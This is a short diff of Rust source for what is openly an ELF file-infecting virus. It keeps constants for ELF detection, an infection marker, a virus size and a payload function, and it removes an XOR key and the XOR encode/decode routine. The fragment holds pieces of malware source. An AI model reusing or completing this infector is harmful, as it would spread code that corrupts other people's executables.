@@ -31,7 +31,6 @@ use std::{env, fs, process};
 
 const ELF_MAGIC: &[u8; 4] = &[0x7f, 0x45, 0x4c, 0x46]; // b"\x7FELF"
 const INFECTION_MARK: &[u8; 5] = &[0x40, 0x54, 0x4d, 0x5a, 0x40]; // @TMZ@
-const XOR_KEY: &[u8; 5] = &[0x46, 0x65, 0x32, 0x4f, 0x33]; // Fe2O3
 const VIRUS_SIZE: u64 = 2696496;
 
 fn payload() {
@@ -46,13 +45,6 @@ fn get_file_size(path: &OsStr) -> u64 {
 fn read_file(path: &OsStr) -> Vec<u8> {
     let buf = fs::read(path).expect("Failed to read file from read_file");
     return buf;
-}
-
-fn xor_enc_dec(mut input: Vec<u8>) -> Vec<u8> {
-    for x in 0..input.len() {
-        input[x] = input[x] ^ XOR_KEY[x % XOR_KEY.len()];
-    }
-    return input;
 }
 
 fn is_elf(path: &OsStr) -> bool {
